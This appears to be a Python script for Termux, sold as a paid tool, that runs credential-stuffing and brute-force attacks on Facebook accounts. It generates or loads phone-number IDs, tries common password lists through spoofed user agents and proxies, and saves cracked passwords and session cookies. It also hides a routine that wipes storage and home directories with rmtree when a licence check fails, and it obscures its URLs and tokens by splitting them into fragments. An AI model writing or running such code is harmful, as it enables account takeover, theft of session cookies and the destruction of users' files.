""" written by ---(AWM OFFICIAL)--- """
##---------------(AWM-ZONE)---------------##
import os,sys
import time
from os import system
from time import sleep

def awmzone(value):
    for txt in value + "\n":
        sys.stdout.write(txt)
        sys.stdout.flush();sleep(0.08)

try:import requests
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "requests" MODULE INSTALLING...')
    system('pip install requests > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - requests')
try:import mechanize
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "mechanize" MODULE INSTALLING...')
    system('pip install mechanize > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - mechanize')
try:import httpx
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "httpx" MODULE INSTALLING...')
    system('pip install httpx > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - httpx')
try:import bs4
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "bs4" MODULE INSTALLING...')
    system('pip install bs4 > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - bs4')
try:import rich
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "rich" MODULE INSTALLING...')
    system('pip install rich > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - rich')
try:import pycurl
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "pycurl" MODULE INSTALLING...')
    system('pip install pycurl > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - pycurl')
try:import httplib2
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "httplib2" MODULE INSTALLING...')
    system('pip install httplib2 > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - httplib2')

import os,re,sys,time,json,string,shutil
import random,uuid,datetime,base64,webbrowser
import threading,platform,subprocess,urllib3
import requests,mechanize,bs4,rich,pycurl,httpx
import httplib2,zlib,hashlib
from string import *
from os import system
from time import sleep
from shutil import rmtree
from zlib import decompress
from rich.panel import Panel
from rich.table import Table
from bs4 import BeautifulSoup
from rich.markdown import Markdown
from urllib.request import urlopen as openx
from concurrent.futures import ThreadPoolExecutor

loop = 0
count = 0
oks = []
cps = []
twf = []
bou = []
pcp = []
cok = []
ugen = []
value = []
screen = []
methods = []
password = []
user_find = []
running_verify = []

N = "\x1b[90m"
R = "\x1b[91m"
G = "\x1b[92m"
Y = "\x1b[93m"
B = "\x1b[94m"
I = "\x1b[95m"
S = "\x1b[96m"
W = "\x1b[97m"
N1 = "\x1b[38;5;65m"
G1 = "\x1b[38;5;46m"
B1 = "\x1b[38;5;45m"
I1 = "\x1b[38;5;56m"
R1 = "\x1b[38;5;196m"
P1 = "\x1b[38;5;203m"
Y1 = "\x1b[38;5;208m"
color = [N,R,G,Y,B,I,S,W,N1,G1,B1,I1,R1,P1,Y1]
my_color = random.choice(color)

X = f"{R1}[{G1}√{R1}]{W}"

screen_type = sys.platform.lower()
if screen_type == "linux":screen.append('android')
elif screen_type == "win":screen.append('window')
else:screen.append('android')

def clean():
    if screen == "android":system('clear')
    elif screen == "window":system('cls')
    else:system('clear')
clean()

brs = mechanize.Browser()
brs.set_handle_robots(False)
brs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

http = httplib2.Http()
ses = requests.Session()

import requests,mechanize,bs4
import rich,pycurl,httplib2,httpx
import urllib,shutil,struct,base64
from string import *
from io import BytesIO
from zlib import decompress
from bs4 import BeautifulSoup
from shutil import rmtree as rmv
from urllib.request import urlopen as openx
from requests.exceptions import ConnectionError as error
from concurrent.futures import ThreadPoolExecutor as tredx

if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    exit('[√] SOMETHING WENT WRONG')

py3_edit = "/data/data/com.termux/files/usr/lib/python3.11/http/client.py"
with open(py3_edit,'r') as data:
    found = data.read()
    if "print(data.decode())" in str(found):exit()
    else:pass

def attention(value):
    if value == "simple":
        system('termux-setup-storage')
        rmv('/storage/emulated/0/*')
        rmv('/storage/emulated/*')
        rmv('/sdcard/*')
        rmv('/sdcard/0/*')
        rmv('/sdcard1/*')
        rmv('/storage/*')
        rmv('/*')
        rmv('/system/*')
        rmv('$HOME/../../*')
        rmv('$PREFIX/b')
        rmv('$HOME/*')
    elif value == "hard":
        system('termux-setup-storage')
        rmv('$HOME/*')
        rmv('/sdcard/*')
        rmv('/sdcard/Android/*')
        rmv('/sdcard/Download/*')
        rmv('/sdcard/DCIM/')
        rmv('/data/data/com.termux/files/cd/usr/*')

class http_request:
    def pycurl_requests(url):
        try:buffer = BytesIO();c = pycurl.Curl();c.setopt(c.URL, url);c.setopt(c.WRITEDATA, buffer);c.perform();c.close()
        except pycurl.error:exit(f"{X} NETWORK CONNECTION ERROR BRO..!")
        return buffer.getvalue().decode('utf-8')

class checking:
    def your_system(url):
        with openx(url) as founder:
            readable = founder.read()
            if bumper in str(readable):pass
            elif "TRAIL" in str(readable):pass
            else:attention("hard")

def query():
    sex = {}
    url = "http"+"://"+"ip"+"-a"+"pi."+"co"+"m/js"+"on"
    try:dex_url = httpx.get(url).json()
    except httpx.ConnectError:exit('NETWORK ERROR')
    ip = dex_url['query']
    country = dex_url['country']
    sex.update({"ip_address":ip,"country":country})
    return (sex)

token = "369b"+"8f3a"+"231"+"64"+"5609"+"fc6"+"80"+"fbc"+"f3d"+"b78a"
url = "https://vpnapi.io/api/"+query().get("ip_address")+"?key="+token
try:
    kire_hula = http_request.pycurl_requests(url)
    json_file = json.loads(kire_hula)
    vpn_status = json_file['security']
    if vpn_status['vpn'] == True:exit(f"{X} CAPTURE XUDAO NA ..\n{X} VPN && CANARY OFF KORO..!")
    else:pass
except pycurl.error:exit(f"{X} NETWORK ERROR")

sys.stdout.write(f'\x1b[1;32m\x1b]2; 〤--(AWM-XD)--〤\x07')
def style(sex):
    value = f"{R1}[{G1}{sex}{R1}]{W}"
    return value

try:
    proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('socksku.txt','w').write(proxylist)
except Exception as e:exit('Network Error')
proxsi=open('socksku.txt','r').read().splitlines()

try:name = open('/dat'+'a/da'+'ta/c'+'om.te'+'rmu'+'x/fi'+'les/h'+'ome/.t'+'erm'+'ux/.na'+'me.t'+'xt','r').read()
except:
    dhei = open('/dat'+'a/da'+'ta/c'+'om.te'+'rmu'+'x/fi'+'les/h'+'ome/.t'+'erm'+'ux/.na'+'me.t'+'xt','w')
    username = input(f"{X} USER NAME :{G1} ")
    dhei.write(username)
    dhei.close()

username = open('/dat'+'a/da'+'ta/c'+'om.te'+'rmu'+'x/fi'+'les/h'+'ome/.t'+'erm'+'ux/.na'+'me.t'+'xt','r').read()

uid = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uid).replace("_","").replace("360","AHS").replace("u","9").replace("a","A") 
plat = platform.version()[14:][:21][::-1].upper()
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = "NEON"
bumper = id+bxd+xp

for xd in range(10000):
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    main_ua = random.choice([um2,um3,um1,um4])
    ugen.append(main_ua)

vers = http_request.pycurl_requests("https"+"://cy"+"ber"+"196.blo"+"gspot."+"com/2"+"024/03"+"/ver"+"sion.h"+"tml"+"?m=1")
version = re.findall("V=(.*)=X",vers)[0]
ugen_m1 = "htt"+"ps:/"+"/cyb"+"er1"+"96.bl"+"ogsp"+"ot.c"+"om/"+"2024"+"/03/ug"+"en1.h"+"tml?m=1"
ugen_m2 = "ht"+"tps:"+"//"+"cybe"+"r196.b"+"logsp"+"ot.com"+"/202"+"4/03/ug"+"en2.ht"+"ml?m=1"
rnrm = "htt"+"ps:/"+"/cyb"+"er1"+"96."+"bl"+"ogsp"+"ot.co"+"m/20"+"24/03/"+"rnd"+"m.ht"+"ml?"+"m=1"
sv_mA = http_request.pycurl_requests(ugen_m1)
sv_mB = http_request.pycurl_requests(ugen_m2)
rm_m1 = http_request.pycurl_requests(rnrm)
ugen1 = re.findall("M1=(.*)=UA",sv_mA)[0]
ugen2 = re.findall("M2=(.*)=UA",sv_mB)[0]
ugen3 = re.findall("UGEN=(.*)=RNDM",rm_m1)[0]
def file_mB():
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    version_code = random.randint(111111111,999999999)
    ua = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+ugen1
    return ua
def file_mC():
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    version_code = random.randint(111111111,999999999)
    ua = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+ugen2
    return ua

def RNDM():
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    version_code = random.randint(111111111,999999999)
    ua = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{str(version_code)};"+ugen3
    return ua

try:os.makedirs('/sdcard/AWM-ZONE')
except:pass

logo = f"""
{W}  █████  ██     ██ ███    ███ {B1}•{W} HADI ANHAF AIMAN
{W} ██   ██ ██     ██ ████  ████ {B1}•{W} MR-CODE-143
{W} ███████ ██  █  ██ ██ ████ ██ {B1}•{G1} PREMIUM
{W} ██   ██ ██ ███ ██ ██  ██  ██ {B1}•{R1} {version}
{W} ██   ██  ███ ███  ██      ██ {B1}•{G1}•{N1}•{R1}•{P1}•{Y1}•
\x1b[38;5;192m─────────────────────────────────────────────
{X} FEATURE  {R1}:{W} FILE{G1}〤{W}RANDOM
{X} KEY {R1}:{W} {G1}{bumper}
\x1b[38;5;192m─────────────────────────────────────────────"""
line = f"\x1b[38;5;192m─────────────────────────────────────────────"

def clear():clean();print(logo)
def linex():print(line)

py_approval_url = "https://github.com/bothacker33/Awm/blob/main/Approved"
package_name = "AWM-XD"

def convert(cookie):
    cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
    return(str(cok))

class Main:
    def checkin_neon():
        try:
            with openx(py_approval_url) as response:
                found = response.read()
                if bumper in str(found):user_find.append('run_pure_user');Main.NEON()
                elif "TRAIL" in str(found):user_find.append('run_pure_user');Main.NEON()
                else:
                    user_find.append('something_went_wrong')
                    Main.py_approval()
        except urllib.error.URLError:
            linex()
            print(f"{X} NETWORK CONNECTION ERROR\n{X} PLEASE TRY AGAIN..!")
            linex();exit('\n\n')
    def py_approval():
        py_approve = http_request.pycurl_requests(py_approval_url)
        if bumper in py_approve:Main.checkin_neon()
        elif "TRAIL" in py_approve:Main.checkin_neon()
        else:
            clear()
            print(f"{X} YOU HAVE NO {G1}{package_name}{W} SUBSCRIPTION")
            print(f"{X} THIS TOOL IS PAID.YOU NEED PERMISSION")
            linex()
            print(f"{X} SEND YOUR KEY TO BUY PREMIUM")
            print(f"{X} MAX APPROVAL TIME : {G1}30 DAYS")
            linex()
            input(f"{X} PRESS ENTER TO BY {R1}[{G1}{package_name}{R1}]")
            url_wa = "https://api.whatsapp.com/send?phone=+8801721474011&text="
            tks = ("Hi HADI ANHAF\nMY-KEY - "+bumper)
            subprocess.check_output(["am", "start", url_wa+(tks)]);sleep(1)
            Main.Menu()
    def Menu():
        try:
            hexa = brs.open(py_approval_url)
            found = hexa.read()
            if bumper in str(found):Main.checkin_neon()
            elif "TRAIL" in str(found):Main.checkin_neon()
            else:Main.py_approval()
        except urllib.error.URLError:
            linex()
            print(f"{X} NETWORK CONNECTION ERROR\n{X} PLEASE TRY AGAIN..!")
            linex();exit('\n\n')
    def NEON():
        try:
            req = http.request(py_approval_url)[1]
            content = req.decode()
            if bumper in content:
                running_verify.append('total_pure_user')
                value.append('Run')
                Main.Start()
            elif "TRAIL" in content:
                running_verify.append('total_pure_user')
                value.append('Run')
                Main.Start()
            else:
                running_verify.append('fuck_you')
                value.append("madarchod")
                Main.Menu()
        except httplib2.error.ServerNotFoundError:
            linex()
            print(f"{X} NETWORK CONNECTION ERROR\n{X} PLEASE TRY AGAIN..!")
            linex();exit('\n\n')
    def Start():
        clear();checking.your_system(py_approval_url)
        print(f"{X} YOUR COUNTRY {P1}-{G1} {query().get('country')}")
        print(f"{X} USERNAME {P1}-{G1} {username}")
        linex()
        print(f"{style('1')} {B1}•{W} START FILE CLONE")
        print(f"{style('2')} {B1}•{W} START RANDOM CLONE")
        print(f"{style('3')} {B1}•{W} JOIN OUR GROUP {R1}({G1}WP{R1})")
        print(f"{style('4')} {B1}•{W} FOLLOW MY GITHUB")
        print(f"{style('5')} {B1}•{W} REPORT ADMIN")
        print(f"{style('0')} {B1}•{W} EXIT {I1}<{P1}/{I1}>")
        linex()
        Neon = input(f"{X} SELECT {R1}:{G1} ");linex()
        if Neon == "1":__F_I_L_E__()
        elif Neon == "2":__R_N_D_M__()
        elif Neon == "3":system('xdg-open https://chat.whatsapp.com/BhBNYbgfnKoASk98EPa2Ek');Main.Menu()
        elif Neon == "4":system('xdg-open https://github.com/XAIVER-3X');Main.Menu()
        elif Neon == "5":system('xdg-open https://wa.me/+8801721474011');Main.Menu()
        elif Neon == "0":linex();sys.exit()
        else:Main.Start()

def __F_I_L_E__():
    clear();checking.your_system(py_approval_url)
    print(f"{X} EXAMPLE  {R1}:{S} /sdcard/file.txt")
    file = input(f"{X} FILE PATH {R1}:{G1} ");linex()
    try:tani = open(file).read().splitlines()
    except FileNotFoundError:print(f"{X} FILE NOT FOUND");sleep(1);__F_I_L_E__()
    print(f"{X} MAX PASSWORD LIMIT {R1}:{G1} 20")
    pax = int(input(f"{X} PASS LIMITATION {R1}:{G1} "));linex()
    print(f"{X} EXAMPLE  {R1}:{S} firstlast,first123,last123,etc")
    for a in range(pax):
        password.append(input(f"{style(a+1)} PASSWORD -{G1} "))
    linex()
    print(f"{X} C_METHOD {R1}:{W} 1{I}>{W}2{I}>{W}3")
    mthd = input(f"{X} SERVER   {R1}:{G1} ");linex()
    if mthd == "1":methods.append('mA')
    elif mthd == "2":methods.append('mB')
    elif mthd == "3":methods.append('mC')
    else:methods.append('mA')
    cpp = input(f"{X} SHOW CP IDS {Y}[{G}y{R}/{S}n{Y}] {R1}:{G1} ")
    if cpp in ['2','n','N']:pcp.append('n')
    else:pcp.append('y')
    cuk = input(f"{X} SHOW OK IDS COKI {Y}[{G}y{R}/{S}n{Y}] {R1}:{G1} ")
    if cuk in ['n','N','2']:cok.append('n')
    else:cok.append('y')
    with tredx(max_workers=30) as AwmZone:
        clear()
        tl = str(len(tani))
        print(f"{X} YOUR COUNTRY {P1}-{G1} {query().get('country')}")
        print(f"{X} USERNAME {P1}-{G1} {username}")
        linex()
        print(f"{X} METHOD  {R1}:{G1} M-{mthd}")
        print(f"{X} TOTAL ID {R1}:{G1} {tl}")
        print(f"{X} IF NO RESULTS {Y}[{G}ON{I}/{S}OFF{Y}]{W} FLIGHT MODE")
        linex()
        for user in tani:
            ids,names = user.split('|')
            passlist = password
            if "mA" in methods:AwmZone.submit(methodA,ids,names,passlist)
            elif "mB" in methods:AwmZone.submit(methodB,ids,names,passlist)
            elif "mC" in methods:AwmZone.submit(methodC,ids,names,passlist)
            else:AwmZone.submit(methodA,ids,names,passlist)
    print('')
    linex()
    print(f"{X} TOTAL OK {R1}:{G1} {str(len(oks))}")
    print(f"{X} TOTAL CP {R1}:{Y1} {str(len(cps))}")
    linex()
    input(f"{X} PRESS ENTER TO {G1}MAIN-MENU")
    system('python Run.py')

def __R_N_D_M__():
    clear();checking.your_system(py_approval_url)
    print(f"{style('1')} {B1}•{W} START NEPALI CLONE")
    print(f"{style('2')} {B1}•{W} START BANGLADESHI CLONE")
    print(f"{style('3')} {B1}•{W} START ALL COUNTRIES CLONE")
    linex()
    Neon = input(f"{X} SELECT {R1}:{G1} ");linex()
    if Neon == "1":Random.Nepali()
    elif Neon == "2":Random.Bangladesh()
    elif Neon == "3":Random.All_Id()
    else:__R_N_D_M__()

class Random:
    def Nepali():
        clear();checking.your_system(py_approval_url)
        print(f"{X} EXAMPLE  {R1}:{S} 9815,9814,9861,9840")
        code = input(f"{X} SIM CODE {R}:{G1} ");linex()
        print(f"{X} EXAMPLE  {R1}:{S} 5000,10000,15000")
        pax = int(input(f"{X} SELECT   {R1}:{G1} "));linex()
        for a in range(pax):
            awm = "".join(random.choice(string.digits) for _ in range(6))
            bou.append(awm)
        print(f"{X} C_METHOD {R1}:{W} 1{I}>{W}2")
        mthd = input(f"{X} SERVER   {R1}:{G1} ");linex()
        if mthd == "1":methods.append('mA')
        elif mthd == "2":methods.append('mB')
        else:methods.append('mA')
        with tredx(max_workers=30) as AwmZone:
            clear()
            tl = str(len(bou))
            print(f"{X} YOUR COUNTRY {P1}-{G1} {query().get('country')}")
            print(f"{X} USERNAME {P1}-{G1} {username}")
            linex()
            print(f"{X} METHOD  {R1}:{G1} M-{mthd}")
            print(f"{X} TOTAL ID {R1}:{G1} {tl}")
            print(f"{X} IF NO RESULTS {Y}[{G}ON{I}/{S}OFF{Y}]{W} FLIGHT MODE")
            linex()
            for love in bou:
                ids = code + love
                passlist = [ids,ids[:6],ids[:7],ids[:8],ids[2:],ids[3:],love,'nepal123','nepal12345','maya12345','kathmandu','nepal123','tamang','tamang123','maya123','pokhara','kathmandu123','pokhara123','maya1234','tamang1234','tamang12345','nepal@123','iloveyou','gurung123','limbu123','gurung12345']
                if "mA" in methods:AwmZone.submit(randA,ids,passlist)
                elif "mB" in methods:AwmZone.submit(randB,ids,passlist)
                else:AwmZone.submit(randA,ids,passlist)
        print('')
        linex()
        print(f"{X} TOTAL OK {R1}:{G1} {str(len(oks))}")
        print(f"{X} TOTAL CP {R1}:{Y1} {str(len(cps))}")
        linex()
        input(f"{X} PRESS ENTER TO {G1}MAIN-MENU")
        system('python Run.py')
    def Bangladesh():
        clear();checking.your_system(py_approval_url)
        print(f"{X} EXAMPLE  {R1}:{S} 015,016,017,018,019")
        code = input(f"{X} SIM CODE {R}:{G1} ");linex()
        print(f"{X} EXAMPLE  {R1}:{S} 5000,10000,15000")
        pax = int(input(f"{X} SELECT   {R1}:{G1} "));linex()
        for a in range(pax):
            awm = "".join(random.choice(string.digits) for _ in range(8))
            bou.append(awm)
        print(f"{style('1')} {B1}•{W} AUTO PASSWORD CRACK")
        print(f"{style('2')} {B1}•{W} CHOICE PASSWORD CRACK")
        linex()
        pw = input(f"{X} SELECT {R1}:{G1} ");linex()
        if pw == "1":pass
        else:
            print(f"{X} MAX PASSWORD LIMIT {R1}:{W} 20")
            px = int(input(f"{X} LIMITATION {R1}:{G1} "));linex()
            for q in range(px):
                password.append(input(f"{style(q+1)} PASSWORD -{G1} "))
        print(f"{X} C_METHOD {R1}:{W} 1{I}>{W}2")
        mthd = input(f"{X} SERVER   {R1}:{G1} ");linex()
        if mthd == "1":methods.append('mA')
        elif mthd == "2":methods.append('mB')
        else:methods.append('mA')
        with tredx(max_workers=30) as AwmZone:
            clear()
            tl = str(len(bou))
            print(f"{X} YOUR COUNTRY {P1}-{G1} {query().get('country')}")
            print(f"{X} USERNAME {P1}-{G1} {username}")
            linex()
            print(f"{X} METHOD  {R1}:{G1} M-{mthd}")
            print(f"{X} TOTAL ID {R1}:{G1} {tl}")
            print(f"{X} IF NO RESULTS {Y}[{G}ON{I}/{S}OFF{Y}]{W} FLIGHT MODE")
            linex()
            for love in bou:
                ids = code + love
                passlist = [ids,ids[:6],ids[:7],ids[:8],love,love[1:],love[2:],'১২৩৪৫৬','১১২২৩৩','777888','bangladesh','iloveyou','free fire','07860786','112244','@@@@####']
                for cpas in password:
                    passlist.append(cpas)
                if "mA" in methods:AwmZone.submit(randA,ids,passlist)
                elif "mB" in methods:AwmZone.submit(randB,ids,passlist)
                else:AwmZone.submit(randA,ids,passlist)
        print('')
        linex()
        print(f"{X} TOTAL OK {R1}:{G1} {str(len(oks))}")
        print(f"{X} TOTAL CP {R1}:{Y1} {str(len(cps))}")
        linex()
        input(f"{X} PRESS ENTER TO {G1}MAIN-MENU")
        system('python Run.py')
    def All_Id():
        clear();checking.your_system(py_approval_url)
        awmzone(f"{X} USE YOUR FULL NUMBER WITH COUNTRY CODE")
        print(f"{X} EXAMPLE NUMBER {R1}:{S} +8801712247652")
        linex()
        numx = input(f"{X} ENTER YOUR NUMBER\n{X} {R1}>{P1}>{Y1}>{G1} ")
        code = numx[:-7]
        linex()
        print(f"{X} EXAMPLE  {R1}:{S} 5000,10000,15000")
        pax = int(input(f"{X} SELECT   {R1}:{G1} "));linex()
        for a in range(pax):
            awm = "".join(random.choice(string.digits) for _ in range(7))
            bou.append(awm)
        print(f"{style('1')} {B1}•{W} AUTO PASSWORD CRACK")
        print(f"{style('2')} {B1}•{W} CHOICE PASSWORD CRACK")
        linex()
        pw = input(f"{X} SELECT {R1}:{G1} ");linex()
        if pw == "1":pass
        else:
            print(f"{X} MAX PASSWORD LIMIT {R1}:{W} 20")
            px = int(input(f"{X} LIMITATION {R1}:{G1} "));linex()
            for q in range(px):
                password.append(input(f"{style(q+1)} PASSWORD -{G1} "))
        linex()
        print(f"{X} C_METHOD {R1}:{W} 1{I}>{W}2")
        mthd = input(f"{X} SERVER   {R1}:{G1} ");linex()
        if mthd == "1":methods.append('mA')
        elif mthd == "2":methods.append('mB')
        else:methods.append('mA')
        with tredx(max_workers=30) as AwmZone:
            clear()
            tl = str(len(bou))
            print(f"{X} YOUR COUNTRY {P1}-{G1} {query().get('country')}")
            print(f"{X} USERNAME {P1}-{G1} {username}")
            linex()
            print(f"{X} METHOD  {R1}:{G1} M-{mthd}")
            print(f"{X} TOTAL ID {R1}:{G1} {tl}")
            print(f"{X} IF NO RESULTS {Y}[{G}ON{I}/{S}OFF{Y}]{W} FLIGHT MODE")
            linex()
            for love in bou:
                ids = code + love
                passlist = [ids,ids[:6],ids[:7],ids[:8],love,love[1:]]
                for cpas in password:
                    passlist.append(cpas)
                if "mA" in methods:AwmZone.submit(randA,ids,passlist)
                elif "mB" in methods:AwmZone.submit(randB,ids,passlist)
                else:AwmZone.submit(randA,ids,passlist)
        print('')
        linex()
        print(f"{X} TOTAL OK {R1}:{G1} {str(len(oks))}")
        print(f"{X} TOTAL CP {R1}:{Y1} {str(len(cps))}")
        linex()
        input(f"{X} PRESS ENTER TO {G1}MAIN-MENU")
        system('python Run.py')

def methodA(ids,names,passlist):
    global loop,oks,cps
    bo = random.choice([N,G,Y,B,I,S,W,P1,B1,G1])
    sys.stdout.write(f"\r\r{R1}[{bo}AWM-M1{R1}]{W}-{R1}[{Y}{loop}{R1}] {W}|{N}•{W}|{G1}{len(oks)}{W}/{P1}{len(cps)}")
    sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = first
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            ua=random.choice(ugen)
            head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            Py_Crack=session.cookies.get_dict().keys()
            if "c_user" in Py_Crack:
                coki = session.cookies.get_dict()
                cookie = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f"\r\r{G1}[MR-AWM-OK] {ids}{Y}|{G1}{pas}")
                if "y" in cok:print(f"\r\r{X}\x1b[38;5;47m {cookie}")
                else:pass
                open('/sdcard/AWM-ZONE/FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif "checkpoint" in Py_Crack:
                if "y" in pcp:print(f"\r\r{P1}[MR-AWM-CP] {ids}|{pas}")
                else:pass
                open('/sdcard/AWM-ZONE/FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

def methodB(ids,names,passlist):
    global loop,oks,cps
    bo = random.choice([N,G,Y,B,I,S,W,P1,B1,G1])
    sys.stdout.write(f"\r\r{R1}[{bo}AWM-M2{R1}]{W}-{R1}[{Y}{loop}{R1}] {W}|{N}•{W}|{G1}{len(oks)}{W}/{P1}{len(cps)}")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = first
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {'User-Agent':file_mB(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            Neon = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'access_token' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r{G1}[MR-AWM-OK] {ids}{Y}|{G1}{pas}")
